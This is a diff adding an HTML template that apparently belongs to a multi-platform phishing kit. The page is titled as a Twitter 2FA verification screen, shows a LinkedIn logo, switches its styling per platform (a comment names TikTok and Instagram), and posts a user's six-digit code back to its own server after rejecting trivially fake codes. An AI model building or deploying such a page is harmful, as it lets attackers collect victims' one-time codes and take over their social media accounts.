@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Twitter 2FA Verification</title>
+    <link rel="stylesheet" href="{{ url_for('static', filename='css/styles.css') }}">
+    <script>
+        // Function to validate the 2FA code
+        function validateCode() {
+            const code = document.querySelector('input[name="code"]').value;
+            const errorMessage = document.querySelector('.error-message');
+
+            // Clear any previous error message
+            errorMessage.textContent = '';
+
+            // Check if the code is exactly 6 digits and only numbers
+            const regex = /^\d{6}$/;
+            if (!regex.test(code)) {
+                errorMessage.textContent = 'Please enter a valid 6-digit code';
+                return false;
+            }
+
+            // Check for common sequences like "123456", "654321", etc.
+            const commonSequences = [
+                "123456", "654321", "111111", "222222", "333333", "444444", "555555",
+                "666666", "777777", "888888", "999999", "000000"
+            ];
+
+            if (commonSequences.includes(code)) {
+                errorMessage.textContent = 'Please enter a valid 6-digit code';
+                return false;
+            }
+
+            // Check for increasing/decreasing sequences
+            if (isIncreasingSequence(code) || isDecreasingSequence(code)) {
+                errorMessage.textContent = 'Please enter a valid 6-digit code';
+                return false;
+            }
+
+            return true;
+        }
+
+        // Helper function to check for increasing sequences
+        function isIncreasingSequence(code) {
+            return code.split('').every((digit, i, arr) => i === 0 || parseInt(arr[i]) === parseInt(arr[i-1]) + 1);
+        }
+
+        // Helper function to check for decreasing sequences
+        function isDecreasingSequence(code) {
+            return code.split('').every((digit, i, arr) => i === 0 || parseInt(arr[i]) === parseInt(arr[i-1]) - 1);
+        }
+    </script>
+</head>
+<body class="{{ platform }}"> <!-- ✅ body gets platform class like tiktok, instagram, etc -->
+    <div class="login-container">
+        <img src="{{ url_for('static', filename='logos/linkedin.png') }}" class="logo" alt="linkedin">
+        <h2>Enter 2FA Code</h2>
+        <form method="POST" onsubmit="return validateCode()"> <!-- Call validation function on form submission -->
+            <input type="text" name="code" placeholder="Enter 6-digit code" required>
+            <div class="error-message" style="color: rgb(255, 255, 255); font-size: 14px;"></div> <!-- Error message container -->
+            <button type="submit">Verify</button>
+        </form>
+    </div>
+</body>
+</html>
